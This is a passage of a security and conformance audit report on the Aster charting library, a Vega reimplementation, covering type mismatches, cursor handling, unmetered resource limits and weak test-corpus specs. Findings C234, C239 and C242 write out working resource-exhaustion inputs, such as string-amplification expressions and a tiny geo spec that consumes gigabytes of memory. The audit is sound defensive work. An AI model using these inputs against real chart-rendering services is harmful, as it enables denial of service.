`packages/core/dist/pulse.d.ts:30,32` (`added: PulseRange | null`); `packages/core/dist/types.d.ts:120-136` (`added?: Array<[number, number]>`); `packages/core/dist/stream.d.ts:70`; `docs/API.md:224-229`; `types.d.ts:114-115` ("added/removed ranges from `diffRows`")

- **Scenario.** `const d = diffRows(a, b)!; session.evaluate(spec, { data: { t: b }, dataPulse: { t: d } })`.
- **Observed.** `TS2322: Type 'RowDiff' is not assignable … Types of property 'added' are incompatible. Type 'PulseRange | null' is not assignable to type '[number, number][] | undefined'`. Same for `stream.push({ pulse: { t: d } })`.
- **Expected.** The documented hand-off compiles.
- **Cause.** One field name with two shapes: `RowDiff.added` is the first range or `null` (the arrays are `addedRanges`/`removedRanges`); `dataPulse.added` is an array of ranges. `PulseRange` and `PulseChange` are not exported from the root, so a consumer cannot name the target type.
- **Runtime is fine.** In JS the `RowDiff` object is accepted and the scene equals a fresh one for append, insert and delete.
- **Status: CONFIRMED-RUN.** `$S/ts/probe.ts` lines 10 and 12 (tsc, strict); `$S/api-probe.mjs` section T1.
- **Direction.** Let `dataPulse` accept `RowDiff`, or export a `toDataPulse(diff)`; rename one of the two `added`s; export `PulseRange`.

#### C279 — Medium — `interactive_line_brush_cursor`: the view's own `cursor` is dropped and the root group never takes the pointer

- **Location:** `packages/core/src/runtime.ts:2072-2084`
- **Status:** CONFIRMED (run; re-run by lead)
- **Area:** gallery / official Vega-Lite examples I
- **Lane ID / scripts:** `gallery3-3` — `gallery3/`

`packages/core/src/runtime.ts:2072-2084` (`frameEncodeOf`), `packages/core/src/cursor.ts:102`, `111-134`, `packages/core/src/hit.ts:537-542`

- **The example:** `"view": {"cursor": "text"}`; its description is "A line chart with text cursor to indicate the brush selection". Both compilers emit the same root `encode: {"update": {"cursor": {"value": "text"}}}`.
- **Vega:** the root group item holds `cursor="text" fill="transparent" stroke="#ddd" box=400x300`. The fill comes from vega's default `config.style.cell` (`vega-parser.js:3671-3673`). vega-scenegraph's group pick makes it the `event.item` wherever nothing else is hit (`vega-scenegraph.js:1992`: `if (!hit && ix && (group.fill || !fore && group.stroke) && hitBackground(…)) hit = group`). So the I-beam shows over the whole plot background.
- **Aster:**
  - `frameEncodeOf` copies x/y, the 13 paint channels and aria; `cursor` is not carried. `SceneRoot` has no cursor field.
  - The cursor tracker reads `opts.pick(x, y)?.item.cursor` (`cursor.ts:102`).
  - Group boxes become hit entries only for nested scope groups (`hit.ts:541-542`); the root frame is not one.
- **Observed:** `pick` returns `null` at an interior point (20,20) and on the frame border, for both the `svg` and the `canvas` index, so the cursor shown is `"default"`. The same holds with `view.fill: "#f8f8f8"` (`scene.frameFill="#f8f8f8"`, pick still `null`), so this is not about the transparent fill.
- **Expected:** `text`. `docs/INTERACTION.md:357` says "The chart's container shows the mouse cursor Vega's view shows".
- **Why the gate is green:** neither engine's SVG string carries a cursor (0 occurrences in both dumps), so no SVG comparison can see one.
- **Status: CONFIRMED-RUN for Aster** (`tsx cursor-pick.mts`, output quoted above); **CONFIRMED-TRACE for Vega's pick** (the root item's values are run; the pick itself is the quoted source line, because Node has no canvas to run it on).
- **Wider than the cursor:** over the plot background Vega's `event.item` is the root group item and Aster's is nothing. I did not find an official example in this range where that changes a selection (vega-lite's tuple expressions guard with `datum && item().mark.marktype !== 'group'`), so it is listed under open questions.
- **Direction:** carry the root encode's `cursor` on the scene root and make the root frame's box a pick-only entry under the same rule as a nested group item's box; or document the deviation in INTERACTION.md "Cursor".

| Lead | SVG diff | Scene diff |
|---|---|---|
| L1 per-item `zindex` channel (overlapping symbols) | FLAGGED | equal |
| L2 mark `zindex` inside a group mark | FLAGGED | equal (0 groups, 0 items) |
| L4 `fill: {color:{r,g,b}}` | FLAGGED | FLAGGED |
| L5 mark `key` with duplicate keys | FLAGGED | FLAGGED |

This also independently reproduces L1, L2, L4 and L5 as real Aster-vs-Vega differences.

#### C234 — Medium — `maxStringLength` and `maxGeneratedBytes` meter only `pad` and number-format width

- **Location:** `packages/core/src/expression.ts:205-216`
- **Status:** CONFIRMED (run)
- **Resolution:** FIXED in #197 (36c5d6b). Fixed: + on strings, join, replace (GetSubstitution), split, repeat-like builtins and upper/lower/trim are metered against maxStringLength/maxGeneratedBytes under limits.
- **Area:** core / expressions, regex screen (also categories 7)
- **Lane ID / scripts:** `core-expr-7` — `core-expr/`

**`maxStringLength` and `maxGeneratedBytes` meter only `pad` and number-format width.**

`LIMITS.md` describes them as covering "a generated string" and "cumulative characters built by expression builtins". Under `{maxStringLength: 10000}`:

| Expression | Result |
|---|---|
| `pad("", 20000, "a")` | refused (control) |
| `replace(pad("",10000,"a"), /a/g, pad("",10000,"b"))` | 100 000 000 characters |
| `join(sequence(0,10000), pad("",10000,"b"))` | 100 028 890 characters |
| `s + s` repeated 12 times over a 10 000-character signal | 40 960 000 characters |
| `split(<10M-character string>, "")` | 10 000 000-element array |

- Intermediates held in signals or fields are never counted; the scene check only sees final mark text.
- **Status:** CONFIRMED-RUN, `p4.mjs str`.
- **Direction:** meter result lengths of `replace`, `join`, `split`, `upper`/`lower`, `truncate`, `substring`, `slice` and string `+` under limits, or narrow the doc lines.

#### C235 — Medium — `timeoutMs`, `maxTimeMs` and `signal` depend on the `fetch` honouring `init.signal`

- **Location:** `packages/core/src/addon-load.ts:260-273`
- **Status:** CONFIRMED (run)
- **Resolution:** FIXED in #192 (1b246a4). Fixed: every await in the loader (allow hook, fetch, text, each read, semaphore wait) is raced against one abort and a late value is never taken; 6 stall points x 3 stoppers all end in time.
- **Area:** core / loading, URL policy, add-ons
- **Lane ID / scripts:** `core-load-9` — `core-load/`

**`timeoutMs`, `maxTimeMs` and `signal` depend on the `fetch` honouring `init.signal`.**
- The abort reaches only `init.signal` and the stream-read race at `:303`, where an already-resolved `read()` beats an already-rejected abort. Nothing checks `signal.aborted` between awaits.
- With a fetch that waits 300 ms and ignores the signal (`r05-timeout.mjs`):
  - `timeoutMs: 50` → `OK after 336 ms`.
  - `maxTimeMs: 50` → `OK after 301 ms`.
  - caller `abort()` at 50 ms → `OK after 301 ms` (resolves with data after the abort).
- A never-settling `allow`, with `timeoutMs 100`, `maxTimeMs 200` and an abort at 300 ms, is still pending at 1 s. So is a no-stream response whose `text()` never settles (`r04` E, F).
- `docs/LIMITS.md:342` says of a custom fetch: "Aster still applies the policy and the caps around it".
- Status: **CONFIRMED-RUN** `r05-timeout.mjs`, `r04-loader-behaviour.mjs` (E, F).

#### C239 — Medium — The force simulation's own loops are outside `maxTimeMs`

- **Location:** `packages/core/src/force-layout.ts:493`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #193 (c93ceb3 04c0854). Fixed: every force tick and every pass of a force ticks, and iterations x tick cost is bounded as work; the four 100 ms cases now stop at ~104 ms.
- **Area:** core / layout transforms, rasterizer (also categories 6)
- **Lane ID / scripts:** `core-layout-3` — `core-layout/`

**The force simulation's own loops are outside `maxTimeMs`.**

- **Cause:** `if (t.static) while (--iters >= 0) sim.tick()` has no clock. `Simulation.tick`, `CenterForce` and `AxisForce` never call `meterTick`. `LinkForce.apply` calls it once after its `iterations` loop. `CollideForce` calls `meterTick('force', n)` with `n = 0` for an empty node list. `iterations` is unbounded at both levels.
- **Observed** (`force-time.mjs <case>`, all with `limits: {maxTimeMs: 100}`; the first four return no error):

| case | spec | time |
|---|---|---|
| `none` | `static`, `forces: []`, 3 nodes, `iterations: 2e8` | 2 385 ms |
| `axis` | `center` + `x`, 3 nodes, `iterations: 5e7` | 2 576 ms |
| `link` | `link` force `iterations: 3e9` over 0 links, 1 tick | 9 316 ms |
| `collide0` | `collide` `iterations: 3e7` over 0 nodes, 1 tick | 8 294 ms |
| `nbody` (control) | `nbody`, 300 nodes, `iterations: 1e7` | `AsterLimitError ... during force` after 107 ms |

- Time is linear in `iterations`. `evaluateChart` also returns normally afterwards, so that entry point never reports the overrun.
- **Status:** CONFIRMED-RUN. `docs/LIMITS.md:217` does not list `force` among the clocked loops, so the doc is accurate by omission.
- **Direction:** `meterTick('force', Math.max(1, n))` in `Simulation.tick` and inside the per-force `iterations` loops.

#### C242 — Medium — geo work is outside every limit

- **Location:** `packages/core/src/geo-resample.ts:17`
- **Status:** CONFIRMED (run)
- **Resolution:** FIXED in #196 (10e8688). Fixed: the geo event buffer counts its growth against the coords ceiling (maxRows/maxGeneratedRows replace it), clip/resample/path stages tick the clock per batch, rejoin is linear; geo-work-bounds; LIMITS.md lists it.
- **Area:** core / geo (also categories 6)
- **Lane ID / scripts:** `core-geo-2` — `core-geo/`
- **Lead's note:** Not re-run by the lead (the repro needs ~1.5 GB under an address-space cap).

`geo-resample.ts:17,63` (`MAX_DEPTH = 16`, up to 65 536 vertices per segment), `geo-events.ts:75-89` (`grow` doubles with no bound), `geo-clip.ts:158-162` (`rejoin` rescans from `first` per ring). No `geo-*.ts` file imports a limit or meter.

- **Issue.** `docs/LIMITS.md` says built-in ceilings hold "for the inputs a tiny spec can use to exhaust the process" and that `maxTimeMs` is checked "every 1024 rows/items or at each metered site". Nothing in the geo pipeline is a metered site. One feature is projected, resampled and serialised in one uninterruptible call.
- **Scenario (`amp2.mjs`).** `projections:[{type:'orthographic', scale:1e12, precision:1e-9, clipAngle:0}]`, one `graticule` dataset (`extent [[0,0],[60,80]], step [1,1]`), one `shape` mark; 323 bytes. With `limits:{maxTimeMs:200}` under `ulimit -v 4500000`:
  ```
  RangeError: Array buffer allocation failed
  threw [aster] limit exceeded: maxTimeMs exceeded during startup 9740ms rss 1496MB
  ```
  That is 9.7 s for a 200 ms budget, stopped only by the address-space cap I imposed. I did not run it uncapped. Estimated demand is about 2 000 segments × 65 536 events × 21 B ≈ 2.7 GB before doubling.
- **Smaller sizes.** `node amp2.mjs 4`: 7 segments → 6.6 MB of path in 156 ms. `maxPathLength` rejects only after the whole path exists.
- **Scaling (`perf.mjs`).** A ring crossing the antimeridian 32 000 times takes 1.3 s (8 000: 95 ms). This is quadratic and matches d3.
- **Status: CONFIRMED-RUN.** Vega has the same cost; the finding is that the documented guarantee does not cover it.
- **Direction.** Meter generated vertices in `Events.grow`/`point` (a `coords`-like ceiling, replaced by `maxGeneratedRows`). Call the clock in the existing per-`BATCH` loops (`clipRange`, `resampleRange`, `rectRange`, `PathWriter.range`) and per ring in `rejoin`. State in LIMITS.md what is covered.

#### C244 — Medium — no deadline; a silent worker leaves `pending: true` forever

Fixed (DECISIONS Q4): timeoutMs (default 30 s) on every worker request; a miss terminates the worker, sets AsterWorkerTimeoutError, replaces a workerFactory worker (no re-post loop), and ends other hooks' requests on it; docs/ERRORS, LIMITS, ADR 0010 updated.

- **Lane ID / scripts:** `react-hooks-6` — `react-hooks/`

#### C245 — Medium — The gate checks key names, not value types, so type-confused or `null` values compile to a chart that differs from vega-lite's instead of being refused

- **Location:** `packages/vl/src/validate.ts:153`
- **Status:** CONFIRMED (run)
- **Resolution:** FIXED in #203 (18a33a7,42276b6,b40ebe8,3736ca6). Fixed (T3): every value is held to a table generated at build time from the pinned vega-lite 6.4.3 JSON schema (scripts/schema-table.mjs -> src/schema-table.ts, regeneration test); a value the schema forbids is refused by its path, replacing 1289b99's hand checks; config keys are checked strictly, spec keys stay with validate.ts + the consumption check; 17 EXTENSIONS (forms vega-lite reads beyond its schema, each pinned by a vega-lite differential and an example) stay accepted. Mutation differential (audit mutate2 bases): schema-invalid inputs drawn differently from vega-lite or failing 76 -> 0; tests vl/test/schema-table.test.ts (independent schema oracle, 20k+ mutations) and conformance/test/vl-schema-values.test.ts. The disputed layer-child width/height stays accepted (vega-lite honours it). Earlier work: #202.
- **Area:** vl / validate, optimize, predicates (also categories 8)
- **Lane ID / scripts:** `vl-rest1-7` — `vl-rest1/`

**The gate checks key names, not value types, so type-confused or `null` values compile to a chart that differs from vega-lite's instead of being refused.**

The README contract is "renders like vega-lite, or throws". For these schema-invalid inputs neither happens; both render and the SVGs differ:

- **Wrong types:** `title: 5` (aster draws a title "5", vega-lite none), `name: 5`, `facet.spacing: "str"`, `config.view: 5`, `config.font: 5`, `config.numberFormat: 5`, `axis.format: 5`, `axis.labelAngle: "str"`, `opacity: {value: "str"}`, `errorbar.extent: null`.
- **`null` where vega-lite reads "unset":** `scale.zero`, `scale.paddingInner`, `scale.padding`, `scale.range`, `mark.opacity`, `config.axis.grid`, `padding`, `background`.
- **`width` / `height` on a layer child:** accepted (`OWN_KEYS.unit`, `validate.ts:153`, is reused for nested units) and honoured, where the schema has no such property and vega-lite ignores them (`emb.mjs` `layer / *`: 19118 vs 12865 bytes).
- **Blocks never looked into:** `title`, `name`, `description`, `padding`, `background`, every `axis` / `legend` / `header` object, `scale` property values, and the inside of every `config` block except `scale`, `concat`, `facet`, `tooltipFormat`, `boxplot`, `projection`, `selection`.
- **Status: CONFIRMED-RUN** — `mutate2.mjs <spec>` (results in `mut-*.txt`; 9,240 mutations, 0 raw errors, about 180 silent divergences), `cls.mjs` (E*, F7, F8, I4, I5).
- **Direction:** generate value-level checks from the vega-lite schema at build time, which would also produce C83 (vl-rest1-4)'s table. At minimum type-check top-level scalars and treat `null` uniformly.

#### C252 — Medium — What the oracle's `compare` and generators cannot see (beyond C85 (docs-arch-3) / C625 (core-rt2-10))

- **Location:** `packages/core/src/incremental-oracle.test.ts:555-573`
- **Status:** CONFIRMED (run)
- **Area:** tests / core (incremental oracle, legacy copies I)
- **Lane ID / scripts:** `tests-core3-4` — `tests-core3/`

`packages/core/src/incremental-oracle.test.ts:555-573` (`norm`), `:594`, `:615-622` (`inputOf`), `:149-282` (`genSpec`).

**Comparison blind spots** (`e2-norm.mjs`, 125 scenarios):
- `__datasets` is a non-enumerable own property of the scene (875 of 875 scenes). `norm` walks `Object.keys`, so the datasets a host reads with `datasetsOfScene`, and that `data()` reads in the event loop, are never compared. Only rows that reach an item's `datum` are.
- A `Set` under `_vgsid_` is flattened to `'[collection]'` (`:564`).
- Only SVG is rendered; canvas and DOM are not.

**Generator blind spots** (each checked against the file):
- No mark drawn from a mark, no mark `transform`, no `key`, no `encode.enter` (every mark is update-only), no mark `sort` except on a line.
- Scales are only linear / band / point / ordinal (plus pow in the census); no log, time, sqrt, quantize, quantile, threshold or scheme.
- Marks are only symbol / text / line / rect / group; no area, arc, rule, path, trail or image.
- No transform that publishes a signal.
- No host signal other than the number `sig`.
- No `layout`.
- No guide `encode`.
- No `format.parse`.
- `t` is never empty: 0 of 2600 states. `remove`/`truncate` keep at least one row (`:390`, `:400`).
- Values are integers only; `null` appears only in `n`.
- Every evaluation receives `structuredClone`d rows (`:620`, `:791`, `:795-797`), so the engine never sees unchanged rows that are the same objects as before, which is what a React host hands it.

**What I probed with a second oracle** (`harness.mjs`: SVG plus `datasetsOfScene`, session and chart):

| Probe | Script | Runs | Failures |
|---|---|---|---|
| oracle scenarios, datasets also compared | `e3-datasets.mjs` | 272 | 0 |
| empty `t` / `u` | `e4a-empty-odd.mjs` MODE=empty | 292 | 0 |
| NaN / undefined / null / ±Infinity / strings / missing fields | `e4a-empty-odd.mjs` MODE=odd | 292 | 0 |
| row identity retained | `e9-identity.mjs` | 280 scenarios, 9240 steps | 0 |
| one row object twice in the array | `e9-identity.mjs` MODE=dup | 280 scenarios, 9240 steps | 0 |
| 17 feature specs (enter/key, area/trail/arc, log/time/quantize/threshold, extent and bin signals, facet aggregate, nested `data()`, host array signals, kde/regression/quantile/sequence, fit+legend+parse, …) | `e4b-features.mjs` | 204 | 9, all mark-from-mark (finding 1) |

So the gaps are real, but only the mark-from-mark gap hides a defect I could find.

**Status: CONFIRMED-RUN** for the blind spots; the generator list is CONFIRMED-TRACE.

**Direction.** Compare `datasetsOfScene` in `sceneKey`; keep row identity for unchanged rows in at least one delivery mode; add the missing shapes, mark-from-mark first.

#### C253 — Medium — `incremental.test.ts` compares SVGs that do not depend on the transform under test

- **Location:** `packages/core/src/incremental.test.ts:95-117`
- **Status:** CONFIRMED (run; re-run by lead)
- **Area:** tests / core (incremental oracle, legacy copies I)
- **Lane ID / scripts:** `tests-core3-6` — `tests-core3/`

`packages/core/src/incremental.test.ts:95-117` (cases at `:101`, `:106`, `:107`), `:133-171` (`:145`, `:150`).

**Scenario** (`e5-incremental-test-vacuity.mjs`). The mark reads only `x` and `v`.
- `stack … as ['v0','v1']`: the SVG is byte-identical when the transform's output fields are overwritten with 12345.
- `pivot`: same result.
- `impute` (key `g`, no groupby): 9 rows in, 9 out. It adds nothing on this input.
- `partition` and `treemap` write `x0/y0/x1/y1` while the mark reads `x`/`y`: all four items sit at `translate(0,0)`.

So "propagates appends through …" cannot fail on a wrong `stack`, `pivot`, `impute`, `partition` or `treemap` result; only the row count is visible.

The title "keeps geo and layout transforms on the mapping path" also overstates:
- it tests no geo transform;
- it asserts the session's diff of the source (`session.pulse()…addedRanges`), not that the transform took the mapping path.

**Status: CONFIRMED-RUN.**

**Direction.** Draw the fields each transform writes, or compare the dataset rows.

#### C255 — Medium — Concat specs with `autosize: none` and no root size render into a 10 px canvas

- **Location:** `packages/conformance/corpus/vlx-geo-concat-explicit-projection-maps.vl.json:4`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #207 (6ef963f2,237df24e). 28 composite specs (all that drew items into a root <= 20 px) use autosize pad; a render scan of the whole corpus finds none left but the by-design autosize-none-padding-unsized.vg.json
- **Area:** corpus / specs, range 4
- **Lane ID / scripts:** `corpus4-1` — `corpus4/`

`vlx-geo-concat-*.vl.json:4` (all ten files have `"autosize": "none"` on line 4).

- **Scenario:** each spec has `padding: 5`, `autosize: "none"` and no top-level `width`/`height` (a concat has none). Vega leaves the root width/height at 0, so the root is only the padding.
- **Observed root sizes** (real Vega and Aster agree):

| Spec | Root w×h |
|---|---|
| `concat-grid-maps`, `concat-merge-nested`, `concat-nested-maps` | 10×10 |
| `concat-explicit-projection-maps`, `concat-map-and-bar`, `concat-two-maps` | 10×150 |
| `concat-layered-maps`, `concat-merged-fit-different-data` | 10×160 |
| `concat-merged-points-and-shapes` | 230×10 |
| `concat-vertical-maps` | 190×10 |

- **Expected:** a root that contains the maps (e.g. about 390×150 for two 180×140 maps).
- **Consequence for the SVG gates:** none; they compare records, which are all present.
- **Consequence for the pixel gate:** `scripts/browser-canvas-parity.mts:65-71` loads every corpus `.json`, and `:249-254` reads `getImageData(0,0,canvas.width,canvas.height)`. For these entries the image would be a 10 px strip or a 5×5 px corner inside the padding.
- **Corpus-wide:** a JSON-only scan finds 64 `.vl.json` specs that combine `autosize: "none"` with concat/hconcat/vconcat/facet/repeat or row/column/facet encodings. Only the 10 in my range were rendered.
- **Status:** CONFIRMED-RUN for the root sizes (`render.mjs`, output in `render.out`). PLAUSIBLE for the pixel-gate consequence; I traced the loader and the pixel read but did not run the browser gate.
- **Overlap:** the prior report notes "949 of 1063 pin autosize none" (line 544/8272) but not this consequence.
- **Direction:** drop `autosize: none` on composite specs (or use `autosize: pad`), or have the pixel gate fail or flag an entry whose canvas is no larger than its padding.

**Independent report of the same defect** (lane ID `corpus2-10`, scripts `corpus2/`, CONFIRMED (run); Facet/repeat specs pin `autosize: none`, so the SVG root is 10×10 with every mark outside it; top-level `width`/`height` are ignored in three):

- **Root size** (`render-all.log`):
  - 10×10: `point-faceted-row.vl.json`, `point-size-facet.vl.json`, `scatter-matrix.vl.json`, `trellis.vl.json`, `vl-facet-2d.vl.json`.
  - 10×310: `repeat.vl.json`.
- **Ignored size:** `repeat.vl.json:3`, `scatter-matrix.vl.json:1` and `vl-facet-2d.vl.json:13-14` put `width`/`height` on a repeat/facet operator. The vega-lite schema rejects them (`validate.mjs`: "additional property") and removing them is INERT.
- **Consequence (traced, not run):** `packages/conformance/src/diff-signals.ts:294-298` samples the hit index on a grid "over the whole SVG" using the scene width/height. For these specs that is a 10×10 corner, so the hit comparison would find nothing. I did not confirm these specs enter that phase.
- The string comparison itself is unaffected (geometry is absolute).
- **Status: CONFIRMED-RUN** for sizes and inertness; **PLAUSIBLE** for the hit grid.
- **Direction:** drop `autosize: none` on composed specs, or move the sizes into the inner `spec`.

**Independent report of the same defect** (lane ID `corpus3-1`, scripts `corpus3/`, CONFIRMED (run; re-run by lead); Composite specs with `autosize: none` and no top-level size render to a ≤10 px canvas; pixel gates compare none of the chart):

`packages/conformance/corpus/vlx-concat-nested-hv.vl.json:4` (`"autosize": "none"`) with `:114` (`"hconcat"`); same shape in `vlx-facet-wrap.vl.json:4,114`; `packages/conformance/scripts/browser-canvas-parity.mts:353-354`.

- **Scenario:** a concat/facet spec has no top-level `width`/`height`, so under `autosize: none` the view is 0 wide/high plus padding 5. The SVG is `10x10`, `10x100` or `10x310`, with the chart translated to (5,5) and extending outside it.
- **Observed:** `render-all.mjs` prints `svg=10x10` (or `10x100`, `10x310`) for all 13 `vlx-concat-*` and all 10 `vlx-facet-*` specs in this range, each with 4–24 mark items.
- **Corpus-wide:** `tiny-viewport.mjs` reports `corpus files 1063; … tiny canvas with marks: 62`. This includes the whole `vlx-hdr-*`, `vlx-geo-concat-*` and `vlx-repeat-*` families, `trellis`, `scatter-matrix`, and `autosize-none-padding-unsized.vg.json` at 0x0.
- **Why it matters:** `browser-canvas-parity.mts` sizes the canvas from the scene (`ours.width = scene.width; ours.height = scene.height`) and compares pixels, so for these entries it compares at most a 10 px strip of background.
- **What still holds:** the canonical-SVG gates (`run-vl.ts`, `browser-conformance`) compare structure, so they do see these marks; every property deletion in these specs changed the canonical SVG.
- **Expected:** composition specs that a pixel gate can see.
- **Status: CONFIRMED-RUN** (`render-all.mjs`, `tiny-viewport.mjs`); the canvas-parity consequence is CONFIRMED-TRACE from the quoted lines. I did not run the browser gate.
- **Direction:** drop `autosize: none` from composite specs (or use `pad`), and add a floor in the pixel gates on canvas area or ink per entry. Related to the "949 of 1,063 pin `autosize: none`" note in the report (line 544), which does not mention this consequence.

**Independent report of the same defect** (lane ID `corpus6-10`, scripts `corpus6/`, CONFIRMED (run); `vlx-vconcat-layer` renders into a 210×10 root (adds to corpus4-1)):

`vlx-vconcat-layer.vl.json:4` (`"autosize": "none"`, no root size).

- **Observed:** root is 210×10 in both engines; 17 data marks are present in the records. It is the only spec in this range with the problem. The `vlx-sel-mv-*` composites do not pin `autosize` and have real root sizes.
- **Status:** CONFIRMED-RUN (`render.out`).
- **Direction:** as C255 (corpus4-1).

#### C257 — Medium — `vlx-geo-fit-center-rotate` cannot fail if `center` and `rotate` are ignored

- **Location:** `packages/conformance/corpus/vlx-geo-fit-center-rotate.vl.json:191`
- **Status:** CONFIRMED (run)
- **Resolution:** FIXED in #207 (237df24e). rotate [-5,-20,0] bites under the fit; vlx-geo-center-explicit-scale is new (centre bites under an explicit scale); centre under a fit stays absorbed by the fit, as vega does
- **Area:** corpus / specs, range 4
- **Lane ID / scripts:** `corpus4-3` — `corpus4/`

`vlx-geo-fit-center-rotate.vl.json:191` (`center [10,50]`), `:195` (`rotate [-5,0,0]`).

- **Scenario:** under auto-fit, a mercator `center` and a longitude-only rotation are absorbed by the fit.
- **Observed:** the oracle SVG is byte-identical to `vlx-geo-fit-default` (sha1 `8b2de7d6…`). Deleting `center`, `rotate`, or both from the spec leaves the oracle output byte-equal.
- **What it does pin:** an engine that applied `center` after the fit would fail. An engine that drops both properties would not.
- **Corpus-wide:** this is the only `.vl.json` with `projection.center`; one `.vg.json` uses it (`geo-vlout-mercator-scale-center`). The VL-to-render path for an effective `center` is ungated.
- **Product check:** `center` with explicit `scale`, `center`+`translate`+`scale`, and fit with `rotate [-5,-20,0]` each give 0 canonical diffs (`p3.mjs`). The last one does change the output, so it would make the spec effective.
- **Status:** CONFIRMED-RUN (`probes.mjs` section A).
- **Direction:** use a rotation with non-zero phi, and add a spec with `center` plus explicit `scale`.

#### C258 — Medium — Five sort specs cannot fail if `sort` is ignored

- **Location:** `packages/conformance/corpus/vlx-sort-ascending.vl.json:121`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #207 (57b5824b). one dataset with distinct first-appearance, alphabetical, count and min/mean/sum/max orders; every sort deletes to a different SVG; ascending is the default and is renamed vlx-sort-ascending-explicit-default
- **Area:** corpus / specs, range 6
- **Lane ID / scripts:** `corpus6-1` — `corpus6/`

`vlx-sort-ascending.vl.json:121`, `vlx-sort-count.vl.json:121`, `vlx-sort-field-default-op.vl.json:121`, `vlx-sort-field-op-mean.vl.json:121`, `vlx-sort-null.vl.json:121`.

- **Scenario:** the shared data has `c` = A, B, A, C, B, C, A, B, so first-appearance order equals alphabetical order. Deleting `encoding.x.sort` from each of the five leaves the SVG unchanged, and all five are byte-identical to each other (hash `ca52355ced`).
- **Why each one is inert:**

| Spec | Reason |
|---|---|
| `sort-ascending` | Ascending is the default. |
| `sort-null` | Data order is A, B, C, the same as sorted order. An engine that sorts when told not to passes. |
| `sort-count` (descending) | Counts are A 3, B 3, C 2; the tie leaves A, B, C. |
| `sort-field-default-op` (`field: v`) | min of v is 2, 3, 6 and mean is 5, 5.33, 6.5; both give A, B, C. Only sum or max would differ. |
| `sort-field-op-mean` (`field: x`) | Mean of x is 3.67, 5, 5; B and C tie, giving A, B, C. `op: min` is also unchanged. |

- **Expected:** each spec's order differs from the default, and from what the neighbouring ops would give.
- **Status:** CONFIRMED-RUN (`probes.mjs` parts A, B, C).
- **Direction:** reorder the data so first appearance is not alphabetical (e.g. start with C), and choose values with no ties whose min, mean, sum and max orders all differ.
- **Related coincidences (Low):** `sort-color-array` (`["C","B","A"]`, `:129`) equals `sort-color-descending`. `sort-neg-x` (`"-x"` on the x channel itself, `:121`) equals `sort-descending`. `sort-array-partial` equals `sort-field-op-max`. corpus1's dup report lists these pairs; the reasons are new here.

#### C259 — Medium — UTC time-unit specs cannot be told from local time in any zone the gates use

- **Location:** `packages/conformance/corpus/vlx-timeunit-utc-month.vl.json:121`
- **Status:** CONFIRMED (run)
- **Resolution:** FIXED in #207 (3f64b161). the three utc specs have boundary timestamps; corpus-tz holds five boundary cases where local differs from utc under New_York and Kolkata (Aster matches vega in all three zones); the main corpus stays UTC-only and TESTING says so
- **Area:** corpus / specs, range 6
- **Lane ID / scripts:** `corpus6-2` — `corpus6/`

`vlx-timeunit-utc-month.vl.json:121`, `vlx-timeunit-utc-yearmonth.vl.json:121`, `vlx-timeunit-object-utc.vl.json:123`.

- **Scenario:** `utcmonth` → `month`, `utcyearmonth` → `yearmonth` and `utc: true` → `false` all leave the SVG unchanged.
- **Zones:** the main corpus runs under `TZ=UTC` only (`scripts/test-tz.mjs:25-43` runs just `corpus-tz` in other zones). The identity also holds under `America/New_York` and `Asia/Kolkata`: `month`, `utc-month` and `object-utc` hash to `f4acf31d25` in all three zones, and `utc-yearmonth`/`yearmonth` to `fe26ff83a0`.
- **Why:** the `t` values (`vlx-timeunit-month.vl.json:16-107`) are date-only strings on the 15th, 20th, 5th, 30th, 11th, 2nd, 25th and 31st. No offset moves any of them across a month boundary.
- **Correction to corpus1:** its dup report says these are "identical only because the run was in UTC". That is not so for this data.
- **Expected:** a VL `utc*` time unit has a corpus case where UTC and local differ.
- **Status:** CONFIRMED-RUN (`tz.mjs`, outputs `tz-UTC.out`, `tz-America_New_York.out`, `tz-Asia_Kolkata.out`; `probes.mjs` part C).
- **Direction:** add timestamps near month and year boundaries (e.g. `2024-01-31T23:30:00Z`, `2024-03-01T00:30:00Z`) and put the three specs (or copies) in `corpus-tz`.
- **Same data weakness (Low):** `vlx-timeunit-hours` (`:121`) has every row at hour 0 in UTC, so it draws one bar. `vlx-timeunit-year` (`:121`) has one year, so it draws one bar. Both still differ from a wrong unit through labels only.

#### C260 — Medium — `vlx-tr-loess-groupby` is the identity transform

- **Location:** `packages/conformance/corpus/vlx-tr-loess-groupby.vl.json:118-123`
- **Status:** CONFIRMED (run; re-run by lead)
- **Resolution:** FIXED in #207 (f9f36afb). twelve points a group: removing the loess transform changes the SVG, bandwidth 0.8 differs from 0.5 and 1
- **Area:** corpus / specs, range 6
- **Lane ID / scripts:** `corpus6-3` — `corpus6/`

`vlx-tr-loess-groupby.vl.json:118-123` (`loess: y, on: x, groupby: [g], bandwidth: 0.8`).

- **Scenario:** each group has 4 points. The loess output rows equal the input rows exactly: p → (1,2), (4,6), (5,5), (7,7); q → (2,4), (3,3), (6,8), (8,9).
- **Observed:** deleting the whole transform leaves the SVG unchanged. So do bandwidths 0.3, 0.5 and 0.8; only bandwidth 1 changes it.

#### C262 — Medium — Nothing guards the gallery ratchet files against being lowered; the gate compares a run to the files, never the files to their history

- **Location:** `packages/conformance/src/gallery/run.ts:51`
- **Status:** CONFIRMED (traced)

`packages/conformance/src/gallery/run.ts:51`, `:68-71`, `:134-136`, `:148-150`; `packages/conformance/gallery/TRIAGE.md:10-12`; `gallery/README.md:113-124`; `.github/workflows/nightly.yml:59,66-69`; `.github/workflows/ci.yml:48-49`

- **Claim.** README: "`floors.json` - passing count per path and grammar (may only go up)… Never lower a floor." TRIAGE.md: "a change that lowers any of them fails the gate."
- **Scenario.** A PR sets `pass.static.vl` to 600, deletes 27 ids from `passing-static.txt`, and optionally removes those files from `manifest.json`.
  - PR CI does not run the gallery; the only readers of these files are `run.ts`, `swap-pairs.ts`, `cache.ts` and `gallery-fetch.mts`.
  - The next nightly keys its cache on the manifest hash (`nightly.yml:59`), fetches the smaller set, and `verifyCache` passes.
  - "specs read == manifest count" (`run.ts:68-71`) passes, because both sides come from the manifest.
  - `pass < floor` and the passing-list check both pass.
- **Also unpinned.** `sources.*.repo` and `commit` go straight into the download URL (`scripts/gallery-fetch.mts:21`); nothing ties them to `vega/vega` at v6.3.1 or to the installed oracle version.

- **Status: CONFIRMED-TRACE** (lines above; grep for every reader of the files). The files are consistent today: `$S/gallery-consistency.mjs`.
